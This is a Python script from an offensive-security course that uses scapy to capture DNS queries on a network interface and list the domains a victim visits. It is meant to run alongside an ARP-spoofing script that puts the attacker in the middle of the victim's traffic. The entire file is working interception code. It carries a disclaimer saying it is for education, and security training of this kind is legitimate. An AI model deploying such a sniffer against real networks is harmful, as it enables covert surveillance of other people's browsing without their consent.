#!/usr/bin/env python3

# Author: Cristian Estarellas
# Version: Final version from hack4you
# Year: 2025
# Source: hack4you.io

# This script is the final version with personal modifications from the practice during the course Offensive Python.
# The goal of this script is strictly for educational purposes and should only be used in a controlled environment 
# with proper authorization.

# Disclaimer:
# This script is provided for educational and research purposes only.
# The author assumes no responsibility for any misuse or illegal activities carried out with this script.
# ------------------------------------------------------------------------------------------------------------------

# To use this script is necessary to spoof the victim target. You can use the script spoofer_arp.py.
# With this script we can observe the domains that the victim is exploring.

# ------------------------------------------------------------------------------------------------------------------

import scapy.all as scapy
import argparse
import signal
import sys

from termcolor import colored

# Ctrl+C
def def_handler(sig, frame):
    print(colored(f"\n[!] Exit...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Arguments inputs: Network Interface
def get_argument():
    parser = argparse.ArgumentParser(description="DNS sniffer")
    parser.add_argument("-i", "--interface", required=True, dest="iface", help="Network interface to sniff")

    args = parser.parse_args()

    return args.iface

# DNS filter
def process_dns_packet(packet):
    if packet.haslayer(scapy.DNSQR):
        domain = packet[scapy.DNSQR].qname.decode()
        # Excluding some domains and showing only once the domain
        exclude_keywords = ["google", "cloud", "bing", "static", "sensic"]
        if domain not in domains_seen and not any(keyword in domain for keyword in exclude_keywords):
            domains_seen.add(domain)        # adding domain to the set
            print(f"[+] Domain: {domain}")

# Sniffer function
def sniff(interface):
    # sniffing interface of a spoofed network
    print(f"\n[+] Intercepting packets from the victim machine:\n")
    scapy.sniff(iface=interface, filter="udp and port 53", prn=process_dns_packet, store=0)

# Main function
def main():
    iface = get_argument()  # Obtaining arguments from input
    sniff(iface)

if __name__ == '__main__':
    global domains_seen
    domains_seen = set()    # Defining a set to exclude some domains
    main()
